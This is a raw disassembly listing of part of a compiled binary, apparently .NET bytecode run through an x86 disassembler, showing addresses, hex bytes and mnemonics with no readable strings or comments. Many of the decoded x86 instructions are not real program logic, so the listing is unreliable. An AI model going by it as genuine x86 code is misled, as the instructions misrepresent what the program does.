  405ee0:	00 00                	add    %al,(%eax)
  405ee2:	00 00                	add    %al,(%eax)
  405ee4:	33 1e                	xor    (%esi),%ebx
  405ee6:	00 00                	add    %al,(%eax)
  405ee8:	19 00                	sbb    %eax,(%eax)
  405eea:	00 00                	add    %al,(%eax)
  405eec:	4c                   	dec    %esp
  405eed:	1e                   	push   %ds
  405eee:	00 00                	add    %al,(%eax)
  405ef0:	0f 00 00             	sldt   (%eax)
  405ef3:	00 24 00             	add    %ah,(%eax,%eax,1)
  405ef6:	00 01                	add    %al,(%ecx)
  405ef8:	00 00                	add    %al,(%eax)
  405efa:	00 00                	add    %al,(%eax)
  405efc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405efd:	1f                   	pop    %ds
  405efe:	00 00                	add    %al,(%eax)
  405f00:	19 00                	sbb    %eax,(%eax)
  405f02:	00 00                	add    %al,(%eax)
  405f04:	be 1f 00 00 0f       	mov    $0xf00001f,%esi
  405f09:	00 00                	add    %al,(%eax)
  405f0b:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f0e:	00 01                	add    %al,(%ecx)
  405f10:	00 00                	add    %al,(%eax)
  405f12:	00 00                	add    %al,(%eax)
  405f14:	78 23                	js     0x405f39
  405f16:	00 00                	add    %al,(%eax)
  405f18:	0c 00                	or     $0x0,%al
  405f1a:	00 00                	add    %al,(%eax)
  405f1c:	84 23                	test   %ah,(%ebx)
  405f1e:	00 00                	add    %al,(%eax)
  405f20:	0f 00 00             	sldt   (%eax)
  405f23:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f26:	00 01                	add    %al,(%ecx)
  405f28:	00 00                	add    %al,(%eax)
  405f2a:	00 00                	add    %al,(%eax)
  405f2c:	c9                   	leave
  405f2d:	23 00                	and    (%eax),%eax
  405f2f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405f32:	00 00                	add    %al,(%eax)
  405f34:	d5 23                	aad    $0x23
  405f36:	00 00                	add    %al,(%eax)
  405f38:	0f 00 00             	sldt   (%eax)
  405f3b:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f3e:	00 01                	add    %al,(%ecx)
  405f40:	00 00                	add    %al,(%eax)
  405f42:	00 00                	add    %al,(%eax)
  405f44:	26 26 00 00          	es add %al,%es:(%eax)
  405f48:	36 00 00             	add    %al,%ss:(%eax)
  405f4b:	00 5c 26 00          	add    %bl,0x0(%esi,%eiz,1)
  405f4f:	00 0f                	add    %cl,(%edi)
  405f51:	00 00                	add    %al,(%eax)
  405f53:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f56:	00 01                	add    %al,(%ecx)
  405f58:	02 00                	add    (%eax),%al
  405f5a:	00 00                	add    %al,(%eax)
  405f5c:	08 26                	or     %ah,(%esi)
  405f5e:	00 00                	add    %al,(%eax)
  405f60:	6e                   	outsb  %ds:(%esi),(%dx)
  405f61:	00 00                	add    %al,(%eax)
  405f63:	00 76 26             	add    %dh,0x26(%esi)
  405f66:	00 00                	add    %al,(%eax)
  405f68:	16                   	push   %ss
	...
  405f75:	00 00                	add    %al,(%eax)
  405f77:	00 aa 31 00 00 aa    	add    %ch,-0x55ffffcf(%edx)
  405f7d:	31 00                	xor    %eax,(%eax)
  405f7f:	00 0f                	add    %cl,(%edi)
  405f81:	00 00                	add    %al,(%eax)
  405f83:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f86:	00 01                	add    %al,(%ecx)
  405f88:	1b 30                	sbb    (%eax),%esi
  405f8a:	05 00 40 00 00       	add    $0x4000,%eax
  405f8f:	00 19                	add    %bl,(%ecx)
  405f91:	00 00                	add    %al,(%eax)
  405f93:	11 16                	adc    %edx,(%esi)
  405f95:	0b 14 0c             	or     (%esp,%ecx,1),%edx
  405f98:	07                   	pop    %es
  405f99:	b5 1f                	mov    $0x1f,%ch
  405f9b:	64 28 c5             	fs sub %al,%ch
  405f9e:	00 00                	add    %al,(%eax)
  405fa0:	0a 13                	or     (%ebx),%dl
  405fa2:	04 12                	add    $0x12,%al
  405fa4:	04 1f                	add    $0x1f,%al
  405fa6:	64 12 02             	adc    %fs:(%edx),%al
  405fa9:	1f                   	pop    %ds
  405faa:	64 28 2d 00 00 06 2c 	sub    %ch,%fs:0x2c060000
  405fb1:	04 17                	add    $0x17,%al
  405fb3:	0a de                	or     %dh,%bl
  405fb5:	1c 07                	sbb    $0x7,%al
  405fb7:	17                   	pop    %ss
  405fb8:	d6                   	salc
  405fb9:	0b 07                	or     (%edi),%eax
  405fbb:	1a 31                	sbb    (%ecx),%dh
  405fbd:	d8 de                	fcomp  %st(6)
  405fbf:	0e                   	push   %cs
  405fc0:	25 28 29 00 00       	and    $0x2928,%eax
  405fc5:	0a 0d 28 2a 00 00    	or     0x2a28,%cl
  405fcb:	0a de                	or     %dh,%bl
  405fcd:	00 16                	add    %dl,(%esi)
  405fcf:	0a 2b                	or     (%ebx),%ch
  405fd1:	00 06                	add    %al,(%esi)
  405fd3:	2a 01                	sub    (%ecx),%al
  405fd5:	10 00                	adc    %al,(%eax)
  405fd7:	00 00                	add    %al,(%eax)
  405fd9:	00 00                	add    %al,(%eax)
  405fdb:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  405fde:	00 0e                	add    %cl,(%esi)
  405fe0:	24 00                	and    $0x0,%al
  405fe2:	00 01                	add    %al,(%ecx)
  405fe4:	13 30                	adc    (%eax),%esi
  405fe6:	03 00                	add    (%eax),%eax
  405fe8:	5f                   	pop    %edi
  405fe9:	00 00                	add    %al,(%eax)
  405feb:	00 1a                	add    %bl,(%edx)
  405fed:	00 00                	add    %al,(%eax)
  405fef:	11 02                	adc    %eax,(%edx)
  405ff1:	28 3b                	sub    %bh,(%ebx)
  405ff3:	00 00                	add    %al,(%eax)
  405ff5:	0a 73 c6             	or     -0x3a(%ebx),%dh
  405ff8:	00 00                	add    %al,(%eax)
  405ffa:	0a 0a                	or     (%edx),%cl
  405ffc:	72 5d                	jb     0x40605b
  405ffe:	02 00                	add    (%eax),%al
  406000:	70 0b                	jo     0x40600d
  406002:	06                   	push   %es
  406003:	6f                   	outsl  %ds:(%esi),(%dx)
  406004:	c7 00 00 0a 13 05    	movl   $0x5130a00,(%eax)
  40600a:	16                   	push   %ss
  40600b:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40600e:	2d 11 05 11 04       	sub    $0x4110511,%eax
  406013:	9a 0d 07 72 4b 0a 00 	lcall  $0xa,$0x4b72070d
  40601a:	70 09                	jo     0x406025
  40601c:	6f                   	outsl  %ds:(%esi),(%dx)
  40601d:	c8 00 00 0a          	enter  $0x0,$0xa
  406021:	28 47 00             	sub    %al,0x0(%edi)
  406024:	00 0a                	add    %cl,(%edx)
  406026:	72 5d                	jb     0x406085
  406028:	0a 00                	or     (%eax),%al
  40602a:	70 28                	jo     0x406054
  40602c:	47                   	inc    %edi
  40602d:	00 00                	add    %al,(%eax)
  40602f:	0a 28                	or     (%eax),%ch
  406031:	66 00 00             	data16 add %al,(%eax)
  406034:	0a 0b                	or     (%ebx),%cl
  406036:	11 04 17             	adc    %eax,(%edi,%edx,1)
  406039:	d6                   	salc
  40603a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40603d:	04 11                	add    $0x11,%al
  40603f:	05 8e b7 32 cb       	add    $0xcb32b78e,%eax
  406044:	07                   	pop    %es
  406045:	28 3b                	sub    %bh,(%ebx)
  406047:	00 00                	add    %al,(%eax)
  406049:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40604c:	00 08                	add    %cl,(%eax)
  40604e:	2a 00                	sub    (%eax),%al
  406050:	13 30                	adc    (%eax),%esi
  406052:	03 00                	add    (%eax),%eax
  406054:	78 00                	js     0x406056
  406056:	00 00                	add    %al,(%eax)
  406058:	1b 00                	sbb    (%eax),%eax
  40605a:	00 11                	add    %dl,(%ecx)
  40605c:	02 28                	add    (%eax),%ch
  40605e:	3b 00                	cmp    (%eax),%eax
  406060:	00 0a                	add    %cl,(%edx)
  406062:	73 c6                	jae    0x40602a
  406064:	00 00                	add    %al,(%eax)
  406066:	0a 0a                	or     (%edx),%cl
  406068:	72 5d                	jb     0x4060c7
  40606a:	02 00                	add    (%eax),%al
  40606c:	70 0b                	jo     0x406079
  40606e:	06                   	push   %es
  40606f:	72 9f                	jb     0x406010
  406071:	0a 00                	or     (%eax),%al
  406073:	70 6f                	jo     0x4060e4
  406075:	c9                   	leave
  406076:	00 00                	add    %al,(%eax)
  406078:	0a 13                	or     (%ebx),%dl
  40607a:	05 16 13 04 2b       	add    $0x2b041316,%eax
  40607f:	41                   	inc    %ecx
  406080:	11 05 11 04 9a 0d    	adc    %eax,0xd9a0411
  406086:	07                   	pop    %es
  406087:	09 6f ca             	or     %ebp,-0x36(%edi)
  40608a:	00 00                	add    %al,(%eax)
  40608c:	0a 72 a7             	or     -0x59(%edx),%dh
  40608f:	0a 00                	or     (%eax),%al
  406091:	70 28                	jo     0x4060bb
  406093:	47                   	inc    %edi
  406094:	00 00                	add    %al,(%eax)
  406096:	0a 09                	or     (%ecx),%cl
  406098:	6f                   	outsl  %ds:(%esi),(%dx)
  406099:	cb                   	lret
  40609a:	00 00                	add    %al,(%eax)
  40609c:	0a 13                	or     (%ebx),%dl
  40609e:	06                   	push   %es
  40609f:	12 06                	adc    (%esi),%al
  4060a1:	28 cc                	sub    %cl,%ah
  4060a3:	00 00                	add    %al,(%eax)
  4060a5:	0a 28                	or     (%eax),%ch
  4060a7:	47                   	inc    %edi
  4060a8:	00 00                	add    %al,(%eax)
  4060aa:	0a 72 a7             	or     -0x59(%edx),%dh
  4060ad:	0a 00                	or     (%eax),%al
  4060af:	70 28                	jo     0x4060d9
  4060b1:	47                   	inc    %edi
  4060b2:	00 00                	add    %al,(%eax)
  4060b4:	0a 28                	or     (%eax),%ch
  4060b6:	66 00 00             	data16 add %al,(%eax)
  4060b9:	0a 0b                	or     (%ebx),%cl
  4060bb:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4060be:	d6                   	salc
  4060bf:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4060c2:	04 11                	add    $0x11,%al
  4060c4:	05 8e b7 32 b7       	add    $0xb732b78e,%eax
  4060c9:	07                   	pop    %es
  4060ca:	28 3b                	sub    %bh,(%ebx)
  4060cc:	00 00                	add    %al,(%eax)
  4060ce:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  4060d1:	00 08                	add    %cl,(%eax)
  4060d3:	2a 1b                	sub    (%ebx),%bl
  4060d5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4060d8:	c5 00                	lds    (%eax),%eax
  4060da:	00 00                	add    %al,(%eax)
  4060dc:	1c 00                	sbb    $0x0,%al
  4060de:	00 11                	add    %dl,(%ecx)
  4060e0:	72 5d                	jb     0x40613f
  4060e2:	02 00                	add    (%eax),%al
  4060e4:	70 0a                	jo     0x4060f0
  4060e6:	28 04 00             	sub    %al,(%eax,%eax,1)
  4060e9:	00 06                	add    %al,(%esi)
  4060eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4060ec:	a1 00 00 0a 6f       	mov    0x6f0a0000,%eax
  4060f1:	cd 00                	int    $0x0
  4060f3:	00 0a                	add    %cl,(%edx)
  4060f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4060f6:	ce                   	into
  4060f7:	00 00                	add    %al,(%eax)
  4060f9:	0a 0d 38 88 00 00    	or     0x8838,%cl
  4060ff:	00 09                	add    %cl,(%ecx)
  406101:	6f                   	outsl  %ds:(%esi),(%dx)
  406102:	cf                   	iret
  406103:	00 00                	add    %al,(%eax)
  406105:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  406108:	6f                   	outsl  %ds:(%esi),(%dx)
  406109:	d0 00                	rolb   $1,(%eax)
  40610b:	00 0a                	add    %cl,(%edx)
  40610d:	18 59 45             	sbb    %bl,0x45(%ecx)
  406110:	04 00                	add    $0x0,%al
  406112:	00 00                	add    %al,(%eax)
  406114:	34 00                	xor    $0x0,%al
  406116:	00 00                	add    %al,(%eax)
  406118:	02 00                	add    (%eax),%al
  40611a:	00 00                	add    %al,(%eax)
  40611c:	4d                   	dec    %ebp
  40611d:	00 00                	add    %al,(%eax)
  40611f:	00 1b                	add    %bl,(%ebx)
  406121:	00 00                	add    %al,(%eax)
  406123:	00 2b                	add    %ch,(%ebx)
  406125:	62 06                	bound  %eax,(%esi)
  406127:	72 c9                	jb     0x4060f2
  406129:	0a 00                	or     (%eax),%al
  40612b:	70 08                	jo     0x406135
  40612d:	6f                   	outsl  %ds:(%esi),(%dx)
  40612e:	d1 00                	roll   $1,(%eax)
  406130:	00 0a                	add    %cl,(%edx)
  406132:	72 5d                	jb     0x406191
  406134:	0a 00                	or     (%eax),%al
  406136:	70 28                	jo     0x406160
  406138:	d2 00                	rolb   %cl,(%eax)
  40613a:	00 0a                	add    %cl,(%edx)
  40613c:	0a 2b                	or     (%ebx),%ch
  40613e:	49                   	dec    %ecx
  40613f:	06                   	push   %es
  406140:	72 d9                	jb     0x40611b
  406142:	0a 00                	or     (%eax),%al
  406144:	70 08                	jo     0x40614e
  406146:	6f                   	outsl  %ds:(%esi),(%dx)
  406147:	d1 00                	roll   $1,(%eax)
  406149:	00 0a                	add    %cl,(%edx)
  40614b:	72 5d                	jb     0x4061aa
  40614d:	0a 00                	or     (%eax),%al
  40614f:	70 28                	jo     0x406179
  406151:	d2 00                	rolb   %cl,(%eax)
  406153:	00 0a                	add    %cl,(%edx)
  406155:	0a 2b                	or     (%ebx),%ch
  406157:	30 06                	xor    %al,(%esi)
  406159:	72 e3                	jb     0x40613e
  40615b:	0a 00                	or     (%eax),%al
  40615d:	70 08                	jo     0x406167
  40615f:	6f                   	outsl  %ds:(%esi),(%dx)
  406160:	d1 00                	roll   $1,(%eax)
  406162:	00 0a                	add    %cl,(%edx)
  406164:	72 5d                	jb     0x4061c3
  406166:	0a 00                	or     (%eax),%al
  406168:	70 28                	jo     0x406192
  40616a:	d2 00                	rolb   %cl,(%eax)
  40616c:	00 0a                	add    %cl,(%edx)
  40616e:	0a 2b                	or     (%ebx),%ch
  406170:	17                   	pop    %ss
  406171:	06                   	push   %es
  406172:	72 ef                	jb     0x406163
  406174:	0a 00                	or     (%eax),%al
  406176:	70 08                	jo     0x406180
  406178:	6f                   	outsl  %ds:(%esi),(%dx)
  406179:	d1 00                	roll   $1,(%eax)
  40617b:	00 0a                	add    %cl,(%edx)
  40617d:	72 5d                	jb     0x4061dc
  40617f:	0a 00                	or     (%eax),%al
  406181:	70 28                	jo     0x4061ab
  406183:	d2 00                	rolb   %cl,(%eax)
  406185:	00 0a                	add    %cl,(%edx)
  406187:	0a 09                	or     (%ecx),%cl
  406189:	6f                   	outsl  %ds:(%esi),(%dx)
  40618a:	be 00 00 0a 3a       	mov    $0x3a0a0000,%esi
  40618f:	6d                   	insl   (%dx),%es:(%edi)
  406190:	ff                   	(bad)
  406191:	ff                   	(bad)
  406192:	ff                   	lcall  (bad)
  406193:	de 0a                	fimuls (%edx)
  406195:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  406198:	09 6f 59             	or     %ebp,0x59(%edi)
  40619b:	00 00                	add    %al,(%eax)
  40619d:	0a dc                	or     %ah,%bl
  40619f:	06                   	push   %es
  4061a0:	0b 2b                	or     (%ebx),%ebp
  4061a2:	00 07                	add    %al,(%edi)
  4061a4:	2a 00                	sub    (%eax),%al
  4061a6:	00 00                	add    %al,(%eax)
  4061a8:	01 10                	add    %edx,(%eax)
  4061aa:	00 00                	add    %al,(%eax)
  4061ac:	02 00                	add    (%eax),%al
  4061ae:	06                   	push   %es
  4061af:	00 af b5 00 0a 00    	add    %ch,0xa00b5(%edi)
  4061b5:	00 00                	add    %al,(%eax)
  4061b7:	00 1b                	add    %bl,(%ebx)
  4061b9:	30 09                	xor    %cl,(%ecx)
  4061bb:	00 87 00 00 00 1d    	add    %al,0x1d000000(%edi)
  4061c1:	00 00                	add    %al,(%eax)
  4061c3:	11 28                	adc    %ebp,(%eax)
  4061c5:	79 00                	jns    0x4061c7
  4061c7:	00 0a                	add    %cl,(%edx)
  4061c9:	02 28                	add    (%eax),%ch
  4061cb:	47                   	inc    %edi
  4061cc:	00 00                	add    %al,(%eax)
  4061ce:	0a 0a                	or     (%edx),%cl
  4061d0:	06                   	push   %es
  4061d1:	28 3b                	sub    %bh,(%ebx)
  4061d3:	00 00                	add    %al,(%eax)
  4061d5:	0a 03                	or     (%ebx),%al
  4061d7:	28 3a                	sub    %bh,(%edx)
  4061d9:	00 00                	add    %al,(%eax)
  4061db:	06                   	push   %es
  4061dc:	74 09                	je     0x4061e7
  4061de:	00 00                	add    %al,(%eax)
  4061e0:	1b 28                	sbb    (%eax),%ebp
  4061e2:	b2 00                	mov    $0x0,%dl
  4061e4:	00 0a                	add    %cl,(%edx)
  4061e6:	20 f4                	and    %dh,%ah
  4061e8:	01 00                	add    %eax,(%eax)
  4061ea:	00 28                	add    %ch,(%eax)
  4061ec:	21 00                	and    %eax,(%eax)
  4061ee:	00 0a                	add    %cl,(%edx)
  4061f0:	14 d0                	adc    $0xd0,%al
  4061f2:	0c 00                	or     $0x0,%al
  4061f4:	00 01                	add    %al,(%ecx)
  4061f6:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4061f9:	00 0a                	add    %cl,(%edx)
  4061fb:	72 fb                	jb     0x4061f8
  4061fd:	0a 00                	or     (%eax),%al
  4061ff:	70 17                	jo     0x406218
  406201:	8d 03                	lea    (%ebx),%eax
  406203:	00 00                	add    %al,(%eax)
  406205:	01 0c 08             	add    %ecx,(%eax,%ecx,1)
  406208:	16                   	push   %ss
  406209:	06                   	push   %es
  40620a:	28 11                	sub    %dl,(%ecx)
  40620c:	00 00                	add    %al,(%eax)
  40620e:	0a a2 08 0d 09 14    	or     0x14090d08(%edx),%ah
  406214:	14 17                	adc    $0x17,%al
  406216:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  406219:	00 01                	add    %al,(%ecx)
  40621b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40621e:	04 16                	add    $0x16,%al
  406220:	17                   	pop    %ss
  406221:	9c                   	pushf
  406222:	11 04 17             	adc    %eax,(%edi,%edx,1)
  406225:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  406229:	0a 26                	or     (%esi),%ah
  40622b:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40622e:	90                   	nop
  40622f:	2c 09                	sub    $0x9,%al
  406231:	09 16                	or     %edx,(%esi)
  406233:	9a 28 11 00 00 0a 0a 	lcall  $0xa0a,$0x1128
  40623a:	de 0e                	fimuls (%esi)
  40623c:	25 28 29 00 00       	and    $0x2928,%eax
  406241:	0a 0b                	or     (%ebx),%cl
  406243:	28 2a                	sub    %ch,(%edx)
  406245:	00 00                	add    %al,(%eax)
  406247:	0a de                	or     %dh,%bl
  406249:	00 2a                	add    %ch,(%edx)
  40624b:	00 01                	add    %al,(%ecx)
  40624d:	10 00                	adc    %al,(%eax)
  40624f:	00 00                	add    %al,(%eax)
  406251:	00 00                	add    %al,(%eax)
  406253:	00 78 78             	add    %bh,0x78(%eax)
  406256:	00 0e                	add    %cl,(%esi)
  406258:	24 00                	and    $0x0,%al
  40625a:	00 01                	add    %al,(%ecx)
  40625c:	26 28 46 00          	sub    %al,%es:0x0(%esi)
  406260:	00 06                	add    %al,(%esi)
  406262:	26 2b 00             	sub    %es:(%eax),%eax
  406265:	2a 00                	sub    (%eax),%al
  406267:	00 13                	add    %dl,(%ebx)
  406269:	30 01                	xor    %al,(%ecx)
  40626b:	00 06                	add    %al,(%esi)
  40626d:	00 00                	add    %al,(%eax)
  40626f:	00 1e                	add    %bl,(%esi)
  406271:	00 00                	add    %al,(%eax)
  406273:	11 16                	adc    %edx,(%esi)
  406275:	0a 2b                	or     (%ebx),%ch
  406277:	00 06                	add    %al,(%esi)
  406279:	2a 00                	sub    (%eax),%al
  40627b:	00 92 02 7b 28 00    	add    %dl,0x287b02(%edx)
  406281:	00 04 17             	add    %al,(%edi,%edx,1)
  406284:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  40628b:	72 07                	jb     0x406294
  40628d:	0b 00                	or     (%eax),%eax
  40628f:	70 16                	jo     0x4062a7
  406291:	8d 03                	lea    (%ebx),%eax
  406293:	00 00                	add    %al,(%eax)
  406295:	01 14 14             	add    %edx,(%esp,%edx,1)
  406298:	14 17                	adc    $0x17,%al
  40629a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40629e:	0a 26                	or     (%esi),%ah
  4062a0:	2a 00                	sub    (%eax),%al
  4062a2:	00 00                	add    %al,(%eax)
  4062a4:	1e                   	push   %ds
  4062a5:	02 28                	add    (%eax),%ch
  4062a7:	17                   	pop    %ss
  4062a8:	00 00                	add    %al,(%eax)
  4062aa:	0a 2a                	or     (%edx),%ch
  4062ac:	13 30                	adc    (%eax),%esi
  4062ae:	03 00                	add    (%eax),%eax
  4062b0:	26 00 00             	add    %al,%es:(%eax)
  4062b3:	00 1f                	add    %bl,(%edi)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	11 19                	adc    %ebx,(%ecx)
  4062b9:	8d 28                	lea    (%eax),%ebp
  4062bb:	00 00                	add    %al,(%eax)
  4062bd:	01 0a                	add    %ecx,(%edx)
  4062bf:	06                   	push   %es
  4062c0:	16                   	push   %ss
  4062c1:	72 13                	jb     0x4062d6
  4062c3:	0b 00                	or     (%eax),%eax
  4062c5:	70 a2                	jo     0x406269
  4062c7:	06                   	push   %es
  4062c8:	17                   	pop    %ss
  4062c9:	72 b0                	jb     0x40627b
  4062cb:	0b 00                	or     (%eax),%eax
  4062cd:	70 a2                	jo     0x406271
  4062cf:	06                   	push   %es
  4062d0:	18 72 c5             	sbb    %dh,-0x3b(%edx)
  4062d3:	0c 00                	or     $0x0,%al
  4062d5:	70 a2                	jo     0x406279
  4062d7:	06                   	push   %es
  4062d8:	80 24 00 00          	andb   $0x0,(%eax,%eax,1)
  4062dc:	04 2a                	add    $0x2a,%al
  4062de:	00 00                	add    %al,(%eax)
  4062e0:	13 30                	adc    (%eax),%esi
  4062e2:	02 00                	add    (%eax),%al
  4062e4:	10 00                	adc    %al,(%eax)
  4062e6:	00 00                	add    %al,(%eax)
  4062e8:	20 00                	and    %al,(%eax)
  4062ea:	00 11                	add    %dl,(%ecx)
  4062ec:	28 d6                	sub    %dl,%dh
  4062ee:	00 00                	add    %al,(%eax)
  4062f0:	0a 02                	or     (%edx),%al
  4062f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4062f3:	d7                   	xlat   %ds:(%ebx)
  4062f4:	00 00                	add    %al,(%eax)
  4062f6:	0a 0a                	or     (%edx),%cl
  4062f8:	2b 00                	sub    (%eax),%eax
  4062fa:	06                   	push   %es
  4062fb:	2a 13                	sub    (%ebx),%dl
  4062fd:	30 02                	xor    %al,(%edx)
  4062ff:	00 10                	add    %dl,(%eax)
  406301:	00 00                	add    %al,(%eax)
  406303:	00 21                	add    %ah,(%ecx)
  406305:	00 00                	add    %al,(%eax)
  406307:	11 28                	adc    %ebp,(%eax)
  406309:	d6                   	salc
  40630a:	00 00                	add    %al,(%eax)
  40630c:	0a 02                	or     (%edx),%al
  40630e:	6f                   	outsl  %ds:(%esi),(%dx)
  40630f:	d8 00                	fadds  (%eax)
  406311:	00 0a                	add    %cl,(%edx)
  406313:	0a 2b                	or     (%ebx),%ch
  406315:	00 06                	add    %al,(%esi)
  406317:	2a 1b                	sub    (%ebx),%bl
  406319:	30 03                	xor    %al,(%ebx)
  40631b:	00 73 00             	add    %dh,0x0(%ebx)
  40631e:	00 00                	add    %al,(%eax)
  406320:	22 00                	and    (%eax),%al
  406322:	00 11                	add    %dl,(%ecx)
  406324:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  40632a:	0b 07                	or     (%edi),%eax
  40632c:	16                   	push   %ss
  40632d:	28 d9                	sub    %bl,%cl
  40632f:	00 00                	add    %al,(%eax)
  406331:	0a 8c 5a 00 00 01 a2 	or     -0x5dff0000(%edx,%ebx,2),%cl
  406338:	07                   	pop    %es
  406339:	17                   	pop    %ss
  40633a:	28 42 00             	sub    %al,0x0(%edx)
  40633d:	00 0a                	add    %cl,(%edx)
  40633f:	a2 07 18 28 da       	mov    %al,0xda281807
  406344:	00 00                	add    %al,(%eax)
  406346:	0a a2 07 19 28 45    	or     0x45281907(%edx),%ah
  40634c:	00 00                	add    %al,(%eax)
  40634e:	0a a2 07 1a 28 db    	or     -0x24d7e5f9(%edx),%ah
  406354:	00 00                	add    %al,(%eax)
  406356:	0a 28                	or     (%eax),%ch
  406358:	dc 00                	faddl  (%eax)
  40635a:	00 0a                	add    %cl,(%edx)
  40635c:	73 dd                	jae    0x40633b
  40635e:	00 00                	add    %al,(%eax)
  406360:	0a 6f de             	or     -0x22(%edi),%ch
  406363:	00 00                	add    %al,(%eax)
  406365:	0a 8c 6d 00 00 01 a2 	or     -0x5dff0000(%ebp,%ebp,2),%cl
  40636c:	07                   	pop    %es
  40636d:	28 4a 00             	sub    %cl,0x0(%edx)
  406370:	00 0a                	add    %cl,(%edx)
  406372:	28 39                	sub    %bh,(%ecx)
  406374:	00 00                	add    %al,(%eax)
  406376:	06                   	push   %es
  406377:	0a de                	or     %dh,%bl
  406379:	1b de                	sbb    %esi,%ebx
  40637b:	19 28                	sbb    %ebp,(%eax)
  40637d:	29 00                	sub    %eax,(%eax)
  40637f:	00 0a                	add    %cl,(%edx)
  406381:	72 ae                	jb     0x406331
  406383:	0d 00 70 0a 28       	or     $0x280a7000,%eax
  406388:	2a 00                	sub    (%eax),%al
  40638a:	00 0a                	add    %cl,(%edx)
  40638c:	de 07                	fiadds (%edi)
  40638e:	28 2a                	sub    %ch,(%edx)
  406390:	00 00                	add    %al,(%eax)
  406392:	0a de                	or     %dh,%bl
  406394:	00 06                	add    %al,(%esi)
  406396:	2a 00                	sub    (%eax),%al
  406398:	01 10                	add    %edx,(%eax)
  40639a:	00 00                	add    %al,(%eax)
  40639c:	00 00                	add    %al,(%eax)
  40639e:	00 00                	add    %al,(%eax)
  4063a0:	58                   	pop    %eax
  4063a1:	58                   	pop    %eax
  4063a2:	00 19                	add    %bl,(%ecx)
  4063a4:	24 00                	and    $0x0,%al
  4063a6:	00 01                	add    %al,(%ecx)
  4063a8:	13 30                	adc    (%eax),%esi
  4063aa:	03 00                	add    (%eax),%eax
  4063ac:	68 00 00 00 23       	push   $0x23000000
  4063b1:	00 00                	add    %al,(%eax)
  4063b3:	11 73 df             	adc    %esi,-0x21(%ebx)
  4063b6:	00 00                	add    %al,(%eax)
  4063b8:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4063bb:	e0 00                	loopne 0x4063bd
  4063bd:	00 0a                	add    %cl,(%edx)
  4063bf:	02 6f d7             	add    -0x29(%edi),%ch
  4063c2:	00 00                	add    %al,(%eax)
  4063c4:	0a 0a                	or     (%edx),%cl
  4063c6:	08 06                	or     %al,(%esi)
  4063c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4063c9:	e1 00                	loope  0x4063cb
  4063cb:	00 0a                	add    %cl,(%edx)
  4063cd:	0a 73 e2             	or     -0x1e(%ebx),%dh
  4063d0:	00 00                	add    %al,(%eax)
  4063d2:	0a 0d 06 13 06 16    	or     0x16061306,%cl
  4063d8:	13 05 2b 20 11 06    	adc    0x611202b,%eax
  4063de:	11 05 91 13 04 09    	adc    %eax,0x9041391
  4063e4:	12 04 72             	adc    (%edx,%esi,2),%al
  4063e7:	c0 0d 00 70 28 e3 00 	rorb   $0x0,0xe3287000
  4063ee:	00 0a                	add    %cl,(%edx)
  4063f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4063f1:	e4 00                	in     $0x0,%al
  4063f3:	00 0a                	add    %cl,(%edx)
  4063f5:	26 11 05 17 d6 13 05 	adc    %eax,%es:0x513d617
  4063fc:	11 05 11 06 8e b7    	adc    %eax,0xb78e0611
  406402:	32 d8                	xor    %al,%bl
  406404:	09 6f e5             	or     %ebp,-0x1b(%edi)
  406407:	00 00                	add    %al,(%eax)
  406409:	0a 16                	or     (%esi),%dl
  40640b:	1f                   	pop    %ds
  40640c:	14 6f                	adc    $0x6f,%al
  40640e:	e6 00                	out    %al,$0x0
  406410:	00 0a                	add    %cl,(%edx)
  406412:	6f                   	outsl  %ds:(%esi),(%dx)
  406413:	e7 00                	out    %eax,$0x0
  406415:	00 0a                	add    %cl,(%edx)
  406417:	0b 2b                	or     (%ebx),%ebp
  406419:	00 07                	add    %al,(%edi)
  40641b:	2a 1b                	sub    (%ebx),%bl
  40641d:	30 02                	xor    %al,(%edx)
  40641f:	00 1b                	add    %bl,(%ebx)
  406421:	00 00                	add    %al,(%eax)
  406423:	00 24 00             	add    %ah,(%eax,%eax,1)
  406426:	00 11                	add    %dl,(%ecx)
  406428:	02 28                	add    (%eax),%ch
  40642a:	e8 00 00 0a 0a       	call   0xa4a642f
  40642f:	de 10                	ficoms (%eax)
  406431:	de 0e                	fimuls (%esi)
  406433:	25 28 29 00 00       	and    $0x2928,%eax
  406438:	0a 0b                	or     (%ebx),%cl
  40643a:	28 2a                	sub    %ch,(%edx)
  40643c:	00 00                	add    %al,(%eax)
  40643e:	0a de                	or     %dh,%bl
  406440:	00 06                	add    %al,(%esi)
  406442:	2a 00                	sub    (%eax),%al
  406444:	01 10                	add    %edx,(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	00 00                	add    %al,(%eax)
  40644a:	00 00                	add    %al,(%eax)
  40644c:	0b 0b                	or     (%ebx),%ecx
  40644e:	00 0e                	add    %cl,(%esi)
  406450:	24 00                	and    $0x0,%al
  406452:	00 01                	add    %al,(%ecx)
  406454:	13 30                	adc    (%eax),%esi
